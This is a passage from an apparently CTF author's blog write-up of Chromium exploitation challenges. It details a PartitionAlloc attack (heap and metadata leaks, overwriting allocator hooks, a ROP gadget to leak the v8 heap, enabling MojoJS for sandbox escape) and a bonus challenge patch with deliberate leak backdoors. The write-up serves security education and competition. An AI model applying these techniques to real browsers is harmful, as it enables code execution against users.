ArrayBufferDetach(a_ab);</span><br><span class="line">    a_ta.set(b_ta, <span class="number">0</span>);</span><br><span class="line">    a_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(size);</span><br><span class="line">    <span class="keyword">if</span> (ret) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The next question is where to allocate. Since we only have heap address so far, let’s see what’s on it.</p>
+<p>In fact, the heap address we leaked is in one of the SuperPages of PartitionAlloc. The layout of the SuperPage is as follows:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| Guard page (4KB) | Metadata page (4KB) | Guard pages (8KB) | Slot span | Slot span | ... | Slot span | Guard page (4KB) |</span><br><span class="line"></span><br><span class="line">0x0000205284e00000 0x0000205284e01000 ---p  &#x2F;&#x2F; Guard page (4KB)</span><br><span class="line">0x0000205284e01000 0x0000205284e02000 rw-p  &#x2F;&#x2F; Metadata page (4KB)</span><br><span class="line">0x0000205284e02000 0x0000205284e04000 ---p  &#x2F;&#x2F; Guard pages (8KB)</span><br><span class="line">0x0000205284e04000 0x0000205284e18000 rw-p  &#x2F;&#x2F; Slot span</span><br><span class="line">0x0000205284e18000 0x0000205285000000 ---p  &#x2F;&#x2F; Guard pages (4KB)</span><br></pre></td></tr></table></figure>
+
+<p>There are two writable pages in SuperPage. Slot span is just the DATA buffer, and the metadata page seems more interesting.</p>
+<p><img src="mem2.png" alt=""></p>
+<p>As you see, we can find Chrome address in metadata page! To leak the address, we can first allocate to the metadata page(e.g. <code>0x205284e01060</code>), then create a new ArrayBuffer with an unused size, it will also create a new bucket and append some useful information to the metadata which we have already claimed.</p>
+<p>After leaking Chrome address, we are able to allocate to global DATA segment of Chrome. Our goal is to turn on the MojoJS flag for the sandbox bypass, which requires arbitrary read/write according to <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755#c3" target="_blank" rel="noopener">markbrand’s exploit</a>. My first thought is to leak the address of v8 heap, so that we can take control of the JS objects and do AAR/AAW as usual. However, our <code>arb_alloc</code> primitive has a weakness, that is it is more like <code>calloc</code> rather than <code>malloc</code>, which means it is difficult to use it to leak any pointer at the DATA segment.</p>
+<p>Luckily, after reading the <a href="https://cs.chromium.org/chromium/src/base/allocator/partition_allocator/partition_alloc.h?rcl=154ef649b0423799ad03df155dc42c67cc7dc7b1&l=679" target="_blank" rel="noopener">source code</a> of PartitionAlloc, i found that just like most memory allocators, there are also some allocator hooks located at global DATA segment such like <code>allocation_override_hook_</code> and <code>free_override_hook_</code>. Overwriting these hooks allows us to control <code>$rip</code> register and even do ROP with a stack pivot. True, it is enough to achieve code execution in Renderer Process, but it is not good enough for the sandbox escape, because we must guarantee the context of the process stay valid. So the best way is still to find the heap address of v8.</p>
+<p>Anyway, let’s see if there is anything useful when it crashes.</p>
+<p><img src="gdb1.png" alt=""></p>
+<p>If you are familiar with v8, you will quickly realize that <code>$r10</code> points to a v8 object. However, in fact <code>$r13</code> is better for us. This is because we can find the address of v8 heap in <code>$r13</code>, but not in <code>$r10</code>.</p>
+<p><img src="mem3.png" alt=""></p>
+<p>Remember that we are in the hook of an allocation, so the return of the function is also the allocated buffer which will be sent back to Javascript. In other words, if we can find a gadget to set <code>$r13</code> to the return value and ensure the context is not destroyed, we will get an ArrayBuffer whose data_ptr points to <code>$r13</code>.</p>
+<p>The solution is shown in the diagram. We first move <code>$r13</code> to <code>$rax</code>, then pop the stack to <strong>frame #6</strong> directly.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#0  0x0000000041414141 in  () ; any gadget</span><br><span class="line">    push   rax  ; for stack alignment</span><br><span class="line">    mov    rax, r13</span><br><span class="line">    add    rsp, 0x28  ---------------------------------------------------------+</span><br><span class="line">    pop    rbx                                                                 |</span><br><span class="line">    pop    r12                                                                 |</span><br><span class="line">    pop    r13                                                                 |</span><br><span class="line">    pop    r14                                                                 |</span><br><span class="line">    pop    r15                                                                 |</span><br><span class="line">    pop    rbp                                                                 |</span><br><span class="line">    ret                                                                        |</span><br><span class="line">#1  0x000055f8f5bac154 in base::PartitionRoot&lt;true&gt;::AllocFlags                |</span><br><span class="line">#2  0x000055f8f5bac154 in blink::ArrayBufferContents::AllocateMemoryWithFlags  |</span><br><span class="line">#3  &lt;libc++ wrong stack frame&gt;                                                 |</span><br><span class="line">#4  &lt;libc++ wrong stack frame&gt;                                                 |</span><br><span class="line">#5  0x000055f8f0577562 in v8::internal::Heap::AllocateExternalBackingStore     |</span><br><span class="line">    test   rax, rax                                                            |</span><br><span class="line">    je     0x55f8f0577576                                                      |</span><br><span class="line">    add    rsp, 0x8                                                            |</span><br><span class="line">    pop    rbx      &lt;----------------------------------------------------------+</span><br><span class="line">    pop    r12</span><br><span class="line">    pop    r13</span><br><span class="line">    pop    r14</span><br><span class="line">    pop    r15</span><br><span class="line">    pop    rbp</span><br><span class="line">    ret</span><br><span class="line">#6  0x000055f8f0717fc0 in v8::internal::BackingStore::Allocate</span><br></pre></td></tr></table></figure>
+
+<p>Since the pattern of the gadget is very common in the binary, we can easily find one at offset  <strong>0x6f81e30</strong> in our challenge. More importantly, we skip the <code>bzero</code> operation in original allocation function, so we can take everything out from the heap and leak the address of v8 heap finally.</p>
+<p>If you are following v8, you probably know that <a href="https://v8.dev/blog/pointer-compression" target="_blank" rel="noopener">Pointer Compression</a> has landed since version 8.0. With pointer compression, the offset of the objects in Old Space is fixed, plus we have already leaked the base address, we can easily corrupt the objects in Javascript via <code>arb_alloc</code> and finally turns to <code>addrof</code>, <code>read</code> and <code>write</code> primitive.</p>
+<p>After turning on the MojoJS flag by AAR/AAW, the last step is to refresh the webpage to enable the feature. However, since the JS context is going to be recreated, all objects are marked as dead and their memory must be reclaimed. Further, it is difficult to avoid segmentation fault when the Garbage Collection tries to reclaim the corrupted ArrayBuffer objects and processes with the freelist.</p>
+<p>This is one of the biggest difficulties in the challenge, but since we already have the ability to arbitrary R/W, we can patch the related functions to prevent the crash. Besides, there is another simple way, that is, to overwrite <code>free_hook_</code> with an empty function, so the free operation does not actually take effect. It perfectly avoid crash during the Garbage Collection since nothing actually happens.</p>
+<p>Moreover, after reading <a href="https://gist.github.com/ujin5/5af3172c627b5d6b0eb3aa2e9276c5dd" target="_blank" rel="noopener">ohjin’s exploit</a>, I learned there is another flag <code>blink::RuntimeEnabledFeatures::is_mojo_js_enabled_</code> located at the global data segment, which could be used to turn the MojoJS on as well. This makes things much easier. We only need to use <code>arb_alloc</code> to overwrite <code>is_mojo_js_enabled_</code> flag and <code>free_hook_</code>, then the door to the next stage opens.</p>
+<p>In summary, with no need for AAR/AAW, the steps of PartionAlloc attack could be:</p>
+<ol>
+<li>leak the heap address</li>
+<li>allocate to Metadata page and leak the chrome address</li>
+<li>allocate to <code>free_hook</code> then overwrite it with an empty_function(<code>\xc3</code> shellcode)</li>
+<li>allocate to <code>is_mojo_js_enabled_</code> then overwrite it with <code>1</code></li>
+<li>window.location.reload()</li>
+</ol>
+<p>After the refresh, everything is exactly the same as Part Ⅱ. Cheers!</p>
+<p>By the way, after the game I learned from @owodelta there was a <a href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/" target="_blank" rel="noopener">wild exploit of PartitionAlloc</a> last month, which seems really cool! And this approach is used by @owodelta in <a href="https://blog.perfect.blue/Chromium-Fullchain" target="_blank" rel="noopener">his writeup</a> of fullchain, <strong>MUST SEE!!!</strong></p>
+<h2 id="Part-Ⅳ-Chromium-Fullchain"><a href="#Part-Ⅳ-Chromium-Fullchain" class="headerlink" title="Part Ⅳ: Chromium Fullchain++"></a>Part Ⅳ: Chromium Fullchain++</h2><p>As I mentioned above, I prepared a bonus challenge. Notice that I left some message in the patch.</p>
+<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+// NOTE: On Windows platform, binary and library address of chrome main process is same</span></span><br><span class="line"><span class="addition">+// as renderer process, so we suppose you already have these addresses in SBX challenge.</span></span><br><span class="line"><span class="addition">+// In fact, even without these two functions, you can also solve this problem, but I don't</span></span><br><span class="line"><span class="addition">+// think it's friendly to players in a 48-hour game. Maybe you can try it after the match :)</span></span><br><span class="line"><span class="addition">+void TStorageImpl::GetLibcAddress(GetLibcAddressCallback callback) &#123;</span></span><br><span class="line"><span class="addition">+    std::move(callback).Run((uint64_t)(&amp;atoi));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+void TStorageImpl::GetTextAddress(GetTextAddressCallback callback) &#123;</span></span><br><span class="line"><span class="addition">+    std::move(callback).Run((uint64_t)(&amp;TStorageImpl::Create));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>As you see, the first challenge is: try to pwn it again without these two backdoors. If you manage to do it, try the second one: How about CFI enabled? CFI prevents from all indirect calls hijacking. The mitigation has already been deployed on Linux and ChromeOS official building and I believe this is the trend.</p>
+<p>The solution of these two add-ons depends on the design of the challenge, so it might not be very general, but I’m pretty sure you could learn something from it more or less. When you solve the bonus question, please let me know and for the top 3 players I will mail some gifts to you, might be some T-shirts or something like that :) Also, I will release my exploit after 3 solves.</p>
+<blockquote>
+<p><strong>Chromium Fullchain++</strong></p>
+<p>Try to solve the fullchain again with CFI enabled.<br>If you manage to execute <code>./flag_printer</code>, please send the exploit to me and I’ll check it locally. My email address is in the attachment.</p>
+<p>Note: Since no one else has checked the challenge, there might be some mistakes. Please contact me if you find something wrong.</p>
+<p><a href="https://drive.google.com/file/d/1DBSQUvoedImJtTNYdOhunCtUcDp7jcIe/view?usp=sharing" target="_blank" rel="noopener">Attachment here</a></p>
+</blockquote>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><h3 id="Public-Writeups"><a href="#Public-Writeups" class="headerlink" title="Public Writeups:"></a>Public Writeups:</h3><ul>
+<li><a href="https://fineas.github.io/FeDEX/post/chromium_rce.html" target="_blank" rel="noopener">[RCE]PwnThyBytes</a></li>
+<li><a href="https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html" target="_blank" rel="noopener">[SBX]r3kapig</a></li>
+<li><a href="https://balsn.tw/ctf_writeup/20200627-0ctf_tctf2020quals/#chromium-sbx" target="_blank" rel="noopener">[SBX]balsn</a></li>
+<li><a href="https://gist.github.com/ujin5/5af3172c627b5d6b0eb3aa2e9276c5dd" target="_blank" rel="noopener">[Fullchain]koreanbadass</a></li>
+<li><a href="https://blog.perfect.blue/Chromium-Fullchain" target="_blank" rel="noopener">[Fullchain]perfect blue</a></li>
+</ul>
+<h3 id="Great-Research-from-chrome-sbx-db"><a href="#Great-Research-from-chrome-sbx-db" class="headerlink" title="Great Research(from chrome-sbx-db)"></a>Great Research(from <a href="https://github.com/allpaca/chrome-sbx-db#awesome-chrome-sandbox-escape" target="_blank" rel="noopener">chrome-sbx-db</a>)</h3><ul>
+<li><a href="https://theori.io/research/escaping-chrome-sandbox/" target="_blank" rel="noopener">Theori Blog (2020) - Cleanly Escaping the Chrome Sandbox</a></li>
+<li><a href="http://www.powerofcommunity.net/poc2019/Gengming.pdf" target="_blank" rel="noopener">KeenLab (POC 2019) - Chrome Exploitation</a></li>
+<li><a href="https://www.youtube.com/watch?v=OoL9nyu-f-Q" target="_blank" rel="noopener">KeenLab (Blackhat USA 2019) - The Most Secure Browser? Pwning Chrome from 2016 to 2019</a></li>
+<li><a href="https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html" target="_blank" rel="noopener">Project Zero Blog (2019) - Virtually Unlimited Memory: Escaping the Chrome Sandbox</a></li>
+<li><a href="http://paper.vulsee.com/OffensiveCon2019/IPC%20You%20Outside%20the%20Sandbox%20-%20One%20bug%20to%20Rule%20the%20Chrome%20Broker/chrome_ipc_exploitation_offensivecon19.pdf" target="_blank" rel="noopener">Niklas Baumstark (OffensiveCon 2019) - IPC you outside the sandbox: One bug to rule the Chrome broker</a></li>
+<li><a href="http://www.powerofcommunity.net/poc2018/ned.pdf" target="_blank" rel="noopener">Ned Williamson (POC 2018) - Exploiting Chrome IPC
+</a></li>
+</ul>
+<h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><ul>
+<li><a href="https://twitter.com/atiflody" target="_blank" rel="noopener">@Melody Chan</a></li>
+<li><a href="https://twitter.com/owodelta" target="_blank" rel="noopener">@owodelta</a></li>
+<li><a href="https://twitter.com/tjbecker_" target="_blank" rel="noopener">@Tim Becker</a></li>
+<li><a href="https://twitter.com/pwn_expoit" target="_blank" rel="noopener">@ohjin</a>, jinmo and <a href="https://twitter.com/vngkv123" target="_blank" rel="noopener">@vngkv123</a></li>
+<li><a href="https://twitter.com/h0twinterDC" target="_blank" rel="noopener">@h0twinter</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Chrome/" rel="tag">#Chrome</a>
+          
+            <a href="/tags/CTF/" rel="tag">#CTF</a>
+          
+        </div>
+      
+
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/xirong.jpg"
+               alt="Gengming Liu" />
+          <p class="site-author-name" itemprop="name">Gengming Liu</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">1</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-Ⅰ-Chromium-RCE"><span class="nav-number">1.</span> <span class="nav-text">Part Ⅰ: Chromium RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-Ⅱ-Chromium-SBX"><span class="nav-number">2.</span> <span class="nav-text">Part Ⅱ: Chromium SBX</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Bug-analysis"><span class="nav-number">2.1.</span> <span class="nav-text">Bug analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCMalloc"><span class="nav-number">2.2.</span> <span class="nav-text">TCMalloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Infoleak"><span class="nav-number">2.3.</span> <span class="nav-text">Infoleak</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-Ⅲ-Chromium-Fullchain"><span class="nav-number">3.</span> <span class="nav-text">Part Ⅲ: Chromium Fullchain</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ArrayBuffer-Neuter"><span class="nav-number">3.1.</span> <span class="nav-text">ArrayBuffer Neuter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PartitionAlloc-Bypass"><span class="nav-number">3.2.</span> <span class="nav-text">PartitionAlloc Bypass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-Ⅳ-Chromium-Fullchain"><span class="nav-number">4.</span> <span class="nav-text">Part Ⅳ: Chromium Fullchain++</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Public-Writeups"><span class="nav-number">5.1.</span> <span class="nav-text">Public Writeups:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Great-Research-from-chrome-sbx-db"><span class="nav-number">5.2.</span> <span class="nav-text">Great Research(from chrome-sbx-db)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Credit"><span class="nav-number">6.</span> <span class="nav-text">Credit</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-chrome"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Gengming Liu</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io" target="_blank" rel="noopener">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next/" target="_blank" rel="noopener">
+    NexT.Mist
+  </a>
+</div>
+
+        
+
+<div class="busuanzi-count">
+
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+  
+</div>
+
+
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.2.3/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.2.3/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+  
+  
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+  </script>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  </script>
+  <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("HfEUHBkxIxPKFFWsM8E29K81-gzGzoHsz", "j8gTHCF5cxmeGRbV0QIujeUw");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script type="text/javascript" async src="//push.zhanzhang.baidu.com/push.js">
+</script>
+
+
+</body>
+</html>
